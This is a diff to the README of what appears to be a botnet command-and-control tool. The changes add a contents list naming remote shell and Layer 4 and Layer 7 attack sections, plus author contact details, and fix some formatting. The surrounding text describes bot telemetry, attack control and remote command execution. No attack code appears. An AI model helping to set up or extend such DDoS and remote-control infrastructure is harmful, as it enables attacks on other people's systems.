@@ -13,14 +13,23 @@
 
 📘 **Changelog:** You can always find the latest and complete change history in  
 [`Docs/CHANGELOG.md`](Docs/CHANGELOG.md)
+
 </div>
 
 ---
+## 📑 Contents
 
+- [Remote Shell](#remote-shell)
+- [Layer 4 (Network)](#layer-4-network)
+- [Layer 7 (Application)](#layer-7-application)
+- [Getting Setup](#-getting-setup)
+- [TUI Mode](#option-1-tui-mode-recommended)
+- [Telnet/Multi-User Mode](#option-2-telnet--multi-user-mode)
+- [Author](#-author)
+
+---
 
 ## 🖥️ CNC Interface (TUI – Bubble Tea)
-
-
 
 The CNC runs as a Terminal User Interface providing live bot telemetry, attack control, and remote command execution.
 
@@ -78,7 +87,6 @@ Interactive shell access with real-time output and command history.
 
 ---
 
-
 ## 🚀 Getting Setup
 
 ### Dependencies (Ubuntu / Debian)
@@ -86,7 +94,7 @@ Interactive shell access with real-time output and command history.
 ```bash
 sudo apt update && sudo apt install -y \
   upx-ucl openssl git wget gcc python3 screen build-essential
-````
+```
 
 ### 1️⃣ Clone the Repository
 
@@ -169,8 +177,15 @@ Bot ⇄ CNC Protocol
 
 ---
 
+## 👤 Author
+
+**Syn**  
+- GitHub: [@syn2much](https://github.com/syn2much)  
+- Telegram: [@sinackrst](https://t.me/sinackrst)
+
+
+---
+
 <p align="center">
 <sub>Maintained with ❤️ by Syn</sub>
 </p>
-
-
